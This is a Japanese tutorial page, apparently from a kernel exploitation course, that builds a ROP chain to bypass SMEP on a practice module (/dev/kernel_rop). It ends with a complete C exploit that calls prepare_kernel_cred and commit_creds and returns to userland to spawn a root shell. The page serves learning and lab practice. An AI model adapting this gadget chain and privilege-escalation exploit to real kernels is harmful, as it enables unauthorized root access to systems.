---
description: カーネル内で ROP を行って SMEP を回避する
---

# Kernel ROP - Privilege Escalation in Kernel Space

前のやり方は失敗したので、純粋に ROP だけで権限昇格を試してみましょう。&#x20;

## Modifying the Payload

### Calling prepare\_kernel\_cred()

まず、ROP チェーンを変更します。役に立つガジェットを探し、`prepare_kernel_cred(0)` を呼び出すところから始めます。

```c
uint64_t pop_rdi    =  0xffffffff811e08ec;
uint64_t swapgs     =  0xffffffff8129011e;
uint64_t iretq_pop1 =  0xffffffff81022e1f;

uint64_t prepare_kernel_cred    = 0xffffffff81066fa0;
uint64_t commit_creds           = 0xffffffff81066e00;

int main() {
    // [...]

    // オーバーフロー
    uint64_t payload[7];

    int i = 6;

    // prepare_kernel_cred(0)
    payload[i++] = pop_rdi;
    payload[i++] = 0;
    payload[i++] = prepare_kernel_cred;
    
    // [...]
}
```

次が最も厄介な部分で、`commit_creds()` を呼ぶ前に、RAX の結果を RDI に移す必要があります。

### Moving RAX to RDI for commit\_creds()

これには、ガジェットをいくつか組み合わせる必要があります(見つけるのにとても時間がかかりました)。自分で見つけられるか試してみてください。

私は、次の 4 つのガジェットを組み合わせました。

```c
0xffffffff810dcf72: pop rdx; ret
0xffffffff811ba595: mov rcx, rax; test rdx, rdx; jne 0x3ba58c; ret;
0xffffffff810a2e0d: mov rdx, rcx; ret;
0xffffffff8126caee: mov rdi, rax; cmp rdi, rdx; jne 0x46cae5; xor eax, eax; ret;
```

* **ガジェット 1** は RDX を `0` にして、**ガジェット 2** の `jne` を回避し、`ret` に到達するために使います
* **ガジェット 2** と **ガジェット 3** は、返された cred 構造体を RAX から RDX に移します
* **ガジェット 4** は、それを RAX から RDI に移した後、RDI と RDX を比較します。`jne` を回避して `ret` に到達するため、この 2 つが等しい必要があります

<pre class="language-c"><code class="lang-c">uint64_t pop_rdx                = 0xffffffff810dcf72;   // pop rdx; ret
uint64_t mov_rcx_rax            = 0xffffffff811ba595;   // mov rcx, rax; test rdx, rdx; jne 0x3ba58c; ret;
uint64_t mov_rdx_rcx            = 0xffffffff810a2e0d;   // mov rdx, rcx; ret;
uint64_t mov_rdi_rax            = 0xffffffff8126caee;   // mov rdi, rax; cmp rdi, rdx; jne 0x46cae5; xor eax, eax; ret;
<strong>
</strong><strong>// [...]
</strong><strong>
</strong><strong>// commit_creds()
</strong>payload[i++] = pop_rdx;
payload[i++] = 0;
payload[i++] = mov_rcx_rax;
payload[i++] = mov_rdx_rcx;
payload[i++] = mov_rdi_rax;
payload[i++] = commit_creds;
</code></pre>

### Returning to userland

`swapgs` と、その後に `iretq` が必要だったことを思い出してください。どちらも簡単に見つかります。

```
0xffffffff8129011e: swapgs; ret;
0xffffffff81022e1f: iretq; pop rbp; ret;
```

`iretq` はどのみち別の場所へジャンプするので、`pop rbp; ret` は重要ではありません。

RIP、CS、SS などの push を再現するには、期待されるとおりのスタックレイアウトを作るだけです。つまり `RIP|CS|RFLAGS|SP|SS` で、push される順序の逆です。

```c
// commit_creds()
payload[i++] = swapgs;
payload[i++] = iretq;
payload[i++] = user_rip;
payload[i++] = user_cs;
payload[i++] = user_rflags;
payload[i++] = user_rsp;
payload[i++] = user_ss;

payload[i++] = (uint64_t) escalate;
```

これで試すと、権限昇格に成功します。

## Final Exploit

```c
// gcc -static -o exploit exploit.c

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>

void get_shell(void){
    puts("[*] Returned to userland");
    system("/bin/sh");
}

uint64_t user_cs;
uint64_t user_ss;
uint64_t user_rsp;
uint64_t user_rflags;

uint64_t user_rip = (uint64_t) get_shell;

void save_state(){
    puts("[*] Saving state");

    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );

    puts("[+] Saved state");
}

void escalate() {
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rcx, 0xffffffff81066fa0;"   // prepare_kernel_cred
	    "call rcx;"
        
        "mov rdi, rax;"
	    "movabs rcx, 0xffffffff81066e00;"   // commit_creds
	    "call rcx;"

        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_rsp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

uint64_t pop_rdi    =  0xffffffff811e08ec;
uint64_t swapgs     =  0xffffffff8129011e;
uint64_t iretq      =  0xffffffff81022e1f;              // iretq; pop rbp; ret

uint64_t prepare_kernel_cred    = 0xffffffff81066fa0;
uint64_t commit_creds           = 0xffffffff81066e00;

uint64_t pop_rdx                = 0xffffffff810dcf72;   // pop rdx; ret
uint64_t mov_rcx_rax            = 0xffffffff811ba595;   // mov rcx, rax; test rdx, rdx; jne 0x3ba58c; ret;
uint64_t mov_rdx_rcx            = 0xffffffff810a2e0d;   // mov rdx, rcx; ret;
uint64_t mov_rdi_rax            = 0xffffffff8126caee;   // mov rdi, rax; cmp rdi, rdx; jne 0x46cae5; xor eax, eax; ret;

int main() {
    save_state();

    // モジュールとやり取りする
    int fd = open("/dev/kernel_rop", O_RDWR);
    printf("FD: %d\n", fd);

    // オーバーフロー
    uint64_t payload[25];

    int i = 6;

    // prepare_kernel_cred(0)
    payload[i++] = pop_rdi;
    payload[i++] = 0;
    payload[i++] = prepare_kernel_cred;

    // commit_creds()
    payload[i++] = pop_rdx;
    payload[i++] = 0;
    payload[i++] = mov_rcx_rax;
    payload[i++] = mov_rdx_rcx;
    payload[i++] = mov_rdi_rax;
    payload[i++] = commit_creds;
        

    // commit_creds()
    payload[i++] = swapgs;
    payload[i++] = iretq;
    payload[i++] = user_rip;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_rsp;
    payload[i++] = user_ss;

    payload[i++] = (uint64_t) escalate;

    write(fd, payload, 0);
}

```
